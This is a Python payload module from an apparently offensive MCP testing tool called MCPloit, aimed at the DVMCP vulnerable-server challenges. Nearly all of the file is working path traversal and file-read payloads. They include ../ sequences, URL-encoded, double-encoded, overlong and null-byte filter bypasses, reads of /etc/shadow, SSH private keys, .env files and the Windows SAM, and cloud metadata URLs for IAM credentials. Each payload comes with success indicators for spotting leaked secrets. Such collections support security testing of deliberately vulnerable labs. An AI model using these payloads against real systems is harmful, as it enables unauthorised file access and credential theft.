"""
Path Traversal Payloads for MCPloit.

Contains payloads for testing path traversal and file access
vulnerabilities in MCP servers.

Target Challenges:
- DVMCP Challenge 3: Excessive Permissions (Path Traversal)
- Lab: Filesystem Workspace Actions (path traversal + RCE)
"""

from .base import Payload, PayloadCategory, PayloadSeverity


def get_payloads() -> list[Payload]:
    """Return all path traversal payloads."""
    return [
        # === PATH TRAVERSAL PAYLOADS ===
        # Challenge 3: WORKS - Direct file_manager path traversal
        # Challenge 10: Requires LLM layer (get_config is indirect injection target)

        # === BASIC PATH TRAVERSAL ===
        Payload(
            name="basic_dotdot",
            description="Basic ../ path traversal to escape directory",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="../../../etc/passwd",
            variants=[
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "../../../../../../etc/passwd",
                "../../../../../../../etc/passwd",
                "..\\..\\..\\etc\\passwd",  # Windows-style
            ],
            target_params=["path", "file", "filename", "filepath", "file_path", "name"],
            success_indicators=[
                "root:", "bin:", "/bin/bash", "/bin/sh",
                "nobody:", "daemon:", ":x:"
            ],
            severity=PayloadSeverity.HIGH,
            technique="directory_traversal",
            context="Classic path traversal using ../ sequences",
        ),

        Payload(
            name="absolute_path_etc",
            description="Direct absolute path access to /etc files",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="/etc/passwd",
            variants=[
                "/etc/shadow",
                "/etc/hosts",
                "/etc/hostname",
                "/etc/group",
                "/etc/sudoers",
                "/etc/ssh/sshd_config",
            ],
            target_params=["path", "file", "filename", "filepath", "file_path"],
            success_indicators=[
                "root:", "localhost", "127.0.0.1", "sshd",
                "nobody:", "sudo"
            ],
            severity=PayloadSeverity.HIGH,
            technique="absolute_path",
            context="Direct access using absolute paths",
        ),

        Payload(
            name="sensitive_linux_files",
            description="Target sensitive Linux configuration files",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="/proc/self/environ",
            variants=[
                "/proc/self/cmdline",
                "/proc/1/environ",
                "/proc/version",
                "/proc/self/status",
                "/proc/self/fd/0",
                "/var/log/auth.log",
                "/var/log/syslog",
                "~/.bash_history",
                "~/.ssh/id_rsa",
                "~/.ssh/authorized_keys",
            ],
            target_params=["path", "file", "filename", "filepath", "file_path"],
            success_indicators=[
                "PATH=", "HOME=", "USER=", "Linux version",
                "ssh-rsa", "PRIVATE KEY", "history"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="sensitive_file_access",
            context="Targets files containing credentials or sensitive info",
        ),

        # === URL ENCODING BYPASSES ===
        Payload(
            name="url_encoded_traversal",
            description="URL encoded path traversal to bypass filters",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            variants=[
                "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",  # Double encoded
            ],
            target_params=["path", "file", "filename", "filepath", "url"],
            success_indicators=[
                "root:", "bin:", "/bin/bash", "passwd"
            ],
            severity=PayloadSeverity.HIGH,
            technique="url_encoding_bypass",
            context="Uses URL encoding to bypass ../ filters",
            encoding="url",
        ),

        Payload(
            name="double_url_encoding",
            description="Double URL encoding to bypass security filters",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            variants=[
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Overlong UTF-8
                "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
                "..%25c0%25af..%25c0%25afetc/passwd",
            ],
            target_params=["path", "file", "filename", "filepath"],
            success_indicators=[
                "root:", "bin:", "/bin/bash"
            ],
            severity=PayloadSeverity.HIGH,
            technique="double_encoding_bypass",
            context="Uses double/overlong encoding to bypass filters",
            encoding="double_url",
        ),

        # === NULL BYTE INJECTION ===
        Payload(
            name="null_byte_injection",
            description="Null byte injection to bypass extension checks",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="../../../etc/passwd%00.txt",
            variants=[
                "../../../etc/passwd\x00.png",
                "../../../etc/passwd%00.jpg",
                "../../../etc/passwd\x00.pdf",
                "/etc/passwd%00.allowed",
            ],
            target_params=["path", "file", "filename", "filepath"],
            success_indicators=[
                "root:", "bin:", "/bin/bash"
            ],
            severity=PayloadSeverity.HIGH,
            technique="null_byte_injection",
            context="Uses null byte to truncate extension validation",
        ),

        # === DVMCP SPECIFIC TARGETS ===
        Payload(
            name="dvmcp_challenge3_private",
            description="Target DVMCP Challenge 3 private directory",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="/tmp/dvmcp_challenge3/private/secret.txt",
            variants=[
                "../private/secret.txt",
                "../../dvmcp_challenge3/private/secret.txt",
                "/tmp/dvmcp_challenge3/private/credentials.txt",
                "/tmp/dvmcp_challenge3/private/",
            ],
            target_params=["path", "file", "filename", "filepath", "file_path"],
            success_indicators=[
                "secret", "credential", "password", "flag", "private"
            ],
            severity=PayloadSeverity.HIGH,
            technique="targeted_path",
            context="Specifically targets DVMCP Challenge 3 secret files",
        ),

        Payload(
            name="dvmcp_challenge8_sensitive",
            description="Target DVMCP Challenge 8 credentials file",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="/tmp/dvmcp_challenge8/sensitive/credentials.txt",
            variants=[
                "../sensitive/credentials.txt",
                "/tmp/dvmcp_challenge8/sensitive/",
                "../../dvmcp_challenge8/sensitive/credentials.txt",
            ],
            target_params=["path", "file", "filename", "filepath"],
            success_indicators=[
                "credential", "password", "secret", "flag", "admin"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="targeted_path",
            context="Specifically targets DVMCP Challenge 8 credentials",
        ),

        # === FILTER BYPASS TECHNIQUES ===
        Payload(
            name="nested_traversal",
            description="Nested traversal sequences to bypass simple filters",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="....//....//....//etc/passwd",
            variants=[
                "..../..../..../etc/passwd",
                "....\\....\\....\\etc\\passwd",
                "..././..././..././etc/passwd",
                "..;/..;/..;/etc/passwd",
            ],
            target_params=["path", "file", "filename", "filepath"],
            success_indicators=[
                "root:", "bin:", "/bin/bash"
            ],
            severity=PayloadSeverity.HIGH,
            technique="nested_traversal",
            context="Uses nested patterns to survive ../ stripping",
        ),

        Payload(
            name="mixed_case_bypass",
            description="Mixed case and encoding variations",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="..%c0%af..%c0%af..%c0%afetc/passwd",
            variants=[
                "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",  # Fullwidth /
                "..\\/etc/passwd",
                "..//etc/passwd",
                ".../etc/passwd",
                "..%5c..%5c..%5cetc%5cpasswd",
            ],
            target_params=["path", "file", "filename", "filepath"],
            success_indicators=[
                "root:", "bin:", "/bin/bash"
            ],
            severity=PayloadSeverity.HIGH,
            technique="encoding_variation",
            context="Uses various encoding tricks to bypass validation",
        ),

        # === WINDOWS PATH TRAVERSAL ===
        Payload(
            name="windows_path_traversal",
            description="Windows-specific path traversal payloads",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="..\\..\\..\\windows\\win.ini",
            variants=[
                "..\\..\\..\\windows\\system32\\config\\sam",
                "..\\..\\..\\users\\administrator\\desktop\\",
                "C:\\windows\\win.ini",
                "C:\\windows\\system.ini",
                "..\\..\\..\\boot.ini",
                "\\\\?\\C:\\windows\\win.ini",
            ],
            target_params=["path", "file", "filename", "filepath"],
            success_indicators=[
                "[fonts]", "[extensions]", "MSDOS.SYS", "boot loader",
                "Administrator", "SAM"
            ],
            severity=PayloadSeverity.HIGH,
            technique="windows_traversal",
            context="Targets Windows systems using backslash separators",
        ),

        # === APPLICATION-SPECIFIC PATHS ===
        Payload(
            name="app_config_files",
            description="Target common application configuration files",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="../../../app/config/database.yml",
            variants=[
                "../../../.env",
                "../../../config.json",
                "../../../settings.py",
                "../../../config/secrets.yml",
                "../../../.git/config",
                "../../../package.json",
                "../../../node_modules/.package-lock.json",
                "../../../requirements.txt",
            ],
            target_params=["path", "file", "filename", "filepath"],
            success_indicators=[
                "password", "secret", "api_key", "database",
                "AWS", "token", "credential", "remote"
            ],
            severity=PayloadSeverity.HIGH,
            technique="config_file_access",
            context="Targets common framework/app configuration files",
        ),

        Payload(
            name="cloud_metadata_access",
            description="Access cloud provider metadata endpoints via file read",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="http://169.254.169.254/latest/meta-data/",
            variants=[
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "file:///proc/self/environ",
            ],
            target_params=["url", "path", "file", "resource"],
            success_indicators=[
                "AccessKeyId", "SecretAccessKey", "Token",
                "aws", "gcp", "azure", "iam"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="ssrf_to_metadata",
            context="Attempts SSRF-style access to cloud metadata",
        ),

        # === SYMLINK AND SPECIAL FILES ===
        Payload(
            name="symlink_access",
            description="Access through symbolic links",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="/proc/self/root/etc/passwd",
            variants=[
                "/proc/1/root/etc/passwd",
                "/dev/stdin",
                "/dev/fd/0",
                "/proc/self/cwd/../../../etc/passwd",
            ],
            target_params=["path", "file", "filename", "filepath"],
            success_indicators=[
                "root:", "bin:", "/bin/bash"
            ],
            severity=PayloadSeverity.HIGH,
            technique="symlink_traversal",
            context="Uses /proc filesystem symlinks for traversal",
        ),

        Payload(
            name="file_protocol_handler",
            description="Use file:// protocol for local file access",
            category=PayloadCategory.PATH_TRAVERSAL,
            payload="file:///etc/passwd",
            variants=[
                "file://localhost/etc/passwd",
                "file:///c:/windows/win.ini",
                "file://127.0.0.1/etc/passwd",
                "file:///proc/self/environ",
            ],
            target_params=["url", "path", "resource", "uri"],
            success_indicators=[
                "root:", "bin:", "[fonts]", "PATH="
            ],
            severity=PayloadSeverity.HIGH,
            technique="file_protocol",
            context="Uses file:// URI scheme for local file access",
        ),
    ]
